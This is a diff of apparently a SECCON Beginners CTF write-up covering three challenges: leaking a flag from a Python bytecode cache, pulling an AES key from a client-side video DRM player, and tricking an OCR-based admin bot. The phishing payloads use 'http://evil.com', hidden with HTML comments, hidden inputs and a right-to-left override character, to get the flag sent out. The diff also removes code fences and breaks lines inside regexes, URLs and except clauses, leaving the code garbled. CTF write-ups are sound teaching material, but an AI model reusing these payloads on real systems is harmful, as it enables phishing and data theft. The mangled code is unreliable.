@@ -56,13 +56,9 @@ if __name__ == "__main__":
  with open(file_path, "rb") as f:
  hash = f.read()
  print(f"{hash=}")
- except:
+ 
+except:
  print("No Hack!!!")
-```
-
-
-
-```
 def get_full_path(file_path: str):
  full_path = os.path.join(os.getcwd(), file_path)
  return os.path.normpath(full_path)
@@ -76,26 +72,12 @@ def check2(file_path: str):
  if os.path.basename(file_path) == "flag.py":
  return False
  return True
-```
-
-
-
-```
 \xa7\r\r\n\x00\x00\x00\x00\n\x12ud<\x00\x00\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xf3\n\x00\x00\x00\x97\x00d\x00Z\x00d\x01S\x00)\x02s\x1b\x00\x00\x00ctf4b{c4ch3_15_0ur_fr13nd!}N)\x01\xda\x04flag\xa9\x00\xf3\x00\x00\x00\x00\xfa\x18/home/ctf/shaXXX/flag.py\xfa\x08<module>r\x06\x00\x00\x00\x01\x00\x00\x00s\x0e\x00\x00\x00\xf0\x03\x01\x01\x01\xe0\x07%\x80\x04\x80\x04\x80\x04r\x04\x00\x00\x00
-```
-
-
-
-```
 $ nc shaxxx.beginners.seccon.games 25612
 3.11.3 (main, May 10 2023, 12:26:31) [GCC 12.2.1 20220924]
-Input your salt file name(default=./flags/sha256.txt):__pycache__/flag.cpython-311.pyc
+Input your salt file name(default=./flags/sha256.txt):
+__pycache__/flag.cpython-311.pyc
 hash=b'\xa7\r\r\n\x00\x00\x00\x00\n\x12ud<\x00\x00\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xf3\n\x00\x00\x00\x97\x00d\x00Z\x00d\x01S\x00)\x02s\x1b\x00\x00\x00ctf4b{c4ch3_15_0ur_fr13nd!}N)\x01\xda\x04flag\xa9\x00\xf3\x00\x00\x00\x00\xfa\x18/home/ctf/shaXXX/flag.py\xfa\x08<module>r\x06\x00\x00\x00\x01\x00\x00\x00s\x0e\x00\x00\x00\xf0\x03\x01\x01\x01\xe0\x07%\x80\x04\x80\x04\x80\x04r\x04\x00\x00\x00'
-```
-
-
-
-```
 const keyUrl = "/enc.key";
 class CustomLoader extends Hls.DefaultConfig.loader {
  constructor(config) {
@@ -107,8 +89,10 @@ class CustomLoader extends Hls.DefaultConfig.loader {
  const onSuccess = callbacks.onSuccess;
  callbacks.onSuccess = function (response, stats, context) {
  response.data = response.data.replace(
- /#EXT-X-KEY:METHOD=.*,URI=".*"/,
- `#EXT-X-KEY:METHOD=AES-128,URI="${keyUrl}"`
+ /#EXT-X-KEY:
+METHOD=.*,URI=".*"/,
+ `#EXT-X-KEY:
+METHOD=AES-128,URI="${keyUrl}"`
  );
  onSuccess(response, stats, context);
  };
@@ -161,40 +145,21 @@ const initWasm = async () => {
 initWasm().then(() => {
  mediaPlayer();
 });
-```
-
-
-
-```
 if (context.url.endsWith(keyUrl)) {
  window.gContext = context
  hlscotext.load(context);
  context = window.gContext;
 }
-```
-
-
-
-```
 key = [99, 9, 61, 110, 94, 114, 119, 194, 42, 163, 63, 8, 97, 114, 131, 41]
-```
-
-
-
-```
 wget https://drmsaw.beginners.seccon.games/public/videos/video0.ts
 wget https://drmsaw.beginners.seccon.games/public/videos/video1.ts
 wget https://drmsaw.beginners.seccon.games/public/videos/video2.ts
-```
-
-
-
-```
 #EXTM3U
 #EXT-X-VERSION:3
 #EXT-X-TARGETDURATION:3
 #EXT-X-MEDIA-SEQUENCE:0
-#EXT-X-KEY:METHOD=AES-128,URI="file:///app/enc.key",IV=0x00000000000000000000000000000000
+#EXT-X-KEY:
+METHOD=AES-128,URI="file:///app/enc.key",IV=0x00000000000000000000000000000000
 #EXTINF:3.040000,
 file:///app/video0.ts
 #EXTINF:3.040000,
@@ -202,26 +167,11 @@ file:///app/video1.ts
 #EXTINF:2.280000,
 file:///app/video2.ts
 #EXT-X-ENDLIST
-```
-
-
-
-```
 def make_key():
  key = [99, 9, 61, 110, 94, 114, 119, 194, 42, 163, 63, 8, 97, 114, 131, 41]
  with open("enc.key", "wb") as f:
  f.write(bytes(key))
-```
-
-
-
-```
 ffmpeg -allowed_extensions ALL -i ./video.m3u8 -c copy video.mp4 -y
-```
-
-
-
-```
 import subprocess
 import requests
 
@@ -242,7 +192,8 @@ def make_m3u8():
 #EXT-X-VERSION:3
 #EXT-X-TARGETDURATION:3
 #EXT-X-MEDIA-SEQUENCE:0
-#EXT-X-KEY:METHOD=AES-128,URI="file:///app/enc.key",IV=0x00000000000000000000000000000000
+#EXT-X-KEY:
+METHOD=AES-128,URI="file:///app/enc.key",IV=0x00000000000000000000000000000000
 #EXTINF:3.040000,
 file:///app/video0.ts
 #EXTINF:3.040000,
@@ -270,35 +221,21 @@ if __name__ == "__main__":
  make_m3u8()
  combine()
  upload()
-```
-
-
-
-```
 (｡˃ ᵕ ˂ ) Congratulation! ctf4b{d1ff1cul7_70_3n5ur3_53cur17y_1n_cl13n7-51d3-4pp5}
-```
-
-
-
-```
 @app.route("/", methods=["POST"])
 def chall():
  try:
  text = request.json["text"]
- except Exception:
+ 
+except Exception:
  return {"message": "text is required."}
  fileId = uuid.uuid4()
  file_path = f"/var/www/uploads/{fileId}.html"
  with open(file_path, "w", encoding="utf-8") as f:
- f.write(f'<p style="font-size:30px">{text}</p>')
+ f.write(f'{text}')
  message, ocr_url, input_url = share2admin(text, fileId)
  os.remove(file_path)
  return {"message": message, "ocr_url": ocr_url, "input_url": input_url}
-```
-
-
-
-```
 import os
 import re
 import pyocr
@@ -306,7 +243,8 @@ import requests
 from PIL import Image
 from selenium import webdriver
 
-APP_URL = os.getenv("APP_URL", "http://localhost:16161/")
+APP_URL = os.getenv("APP_URL", "http://localhost:
+16161/")
 FLAG = os.getenv("FLAG", "ctf4b{dummy_flag}")
 
 # read text from image
@@ -333,7 +271,8 @@ def openWebPage(fileId: str):
  text = ocr(image_path)
  os.remove(image_path)
  return text
- except Exception:
+ 
+except Exception:
  return None
 
 def find_url_in_text(text: str):
@@ -360,43 +299,20 @@ def share2admin(input_text: str, fileId: str):
  try:
  # It seems safe url, therefore let's open the web page.
  requests.get(f"{input_url}?flag={FLAG}")
- except Exception:
+ 
+except Exception:
  return "admin: I could not open that inner link.", ocr_url, input_text
  return "admin: Very good web site. Thanks for sharing!", ocr_url, input_text
-```
-
-
-
-```
 def find_url_in_text(text: str):
  result = re.search(r"https?://[\w/:&\?\.=]+", text)
  if result is None:
  return ""
  else:
  return result.group()
-```
-
-
-
-```
 <!--http://evil.com-->https://phisher2.beginners.seccon.games/
-```
-
-
-
-```
-[U+202E]http://evil.com/semag.nocces.srennigeb.2rehsihp//:sptth
-```
-
-
-
-```
-<input type="hidden" value="http://evil.com" />https://phisher2.beginners.seccon.games/
-```
-
-
-
-```
+[U+202E]http://evil.com/semag.nocces.srennigeb.2rehsihp//:
+sptth
+https://phisher2.beginners.seccon.games/
 import requests
 import json
 import os
